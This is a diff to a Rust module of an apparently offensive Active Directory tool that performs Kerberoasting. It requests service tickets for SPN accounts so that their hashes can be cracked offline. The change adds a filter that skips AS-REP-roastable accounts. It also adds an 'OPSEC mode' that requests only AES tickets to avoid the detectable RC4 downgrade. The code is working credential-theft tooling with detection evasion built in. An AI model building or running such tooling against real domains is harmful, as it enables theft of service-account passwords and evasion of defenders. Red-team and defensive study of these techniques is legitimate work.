@@ -18,18 +18,9 @@ use std::path::PathBuf;
 use tracing::{debug, info, warn};
 
 // ═══════════════════════════════════════════════════════════
-// UAC constants
-// ═══════════════════════════════════════════════════════════
-
-#[allow(dead_code)] // Protocol reference UAC flag
-const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
-#[allow(dead_code)] // Protocol reference UAC flag
-const UAC_NORMAL_ACCOUNT: u32 = 0x00000200;
-
-// ═══════════════════════════════════════════════════════════
 // Configuration
 // ═══════════════════════════════════════════════════════════
-/// Structure
+/// Kerberoast configuration
 #[derive(Debug, Clone)]
 pub struct KerberoastConfig {
     /// Specific SPNs to target (skip LDAP enumeration if provided)
@@ -49,6 +40,10 @@ pub struct KerberoastConfig {
     /// SPN filter glob pattern (e.g. "http/*", "MSSQL*", "CIFS/*")
     /// Only SPNs matching this pattern will be targeted.
     pub spn_filter: Option<String>,
+    /// Skip accounts that don't require Kerberos pre-authentication
+    /// (AS-REP roastable — more efficiently attacked via asreproast).
+    /// Default: true
+    pub skip_asrep_roastable: bool,
 }
 
 impl Default for KerberoastConfig {
@@ -66,6 +61,7 @@ impl Default for KerberoastConfig {
             admin_only: false,
             downgrade_to_rc4: false,
             spn_filter: None,
+            skip_asrep_roastable: true,
         }
     }
 }
@@ -154,6 +150,16 @@ async fn enumerate_spn_accounts(
         // Skip disabled accounts
         if kc.skip_disabled && !u.enabled {
             debug!("Skipping disabled account: {}", u.sam_account_name);
+            continue;
+        }
+
+        // Skip accounts that don't require Kerberos pre-authentication
+        // These are more efficiently attacked via AS-REP roasting
+        if kc.skip_asrep_roastable && u.dont_req_preauth {
+            debug!(
+                "Skipping AS-REP-roastable account (use asreproast instead): {}",
+                u.sam_account_name
+            );
             continue;
         }
 
@@ -289,7 +295,13 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
     for (sam, spn, dn, admin_count, pwd_last_set) in &spn_targets {
         pb.set_message(spn.clone());
 
-        match kerberos::kerberoast(&config.dc_ip, &tgt, spn).await {
+        let roast_result = if kc.downgrade_to_rc4 {
+            kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, false).await
+        } else {
+            // OPSEC mode: request only AES256/AES128 (no RC4 downgrade)
+            kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, true).await
+        };
+        match roast_result {
             Ok(crackable) => {
                 let etype_label = match crackable.hash_string.as_str() {
                     s if s.contains("$krb5tgs$23$") => "RC4",
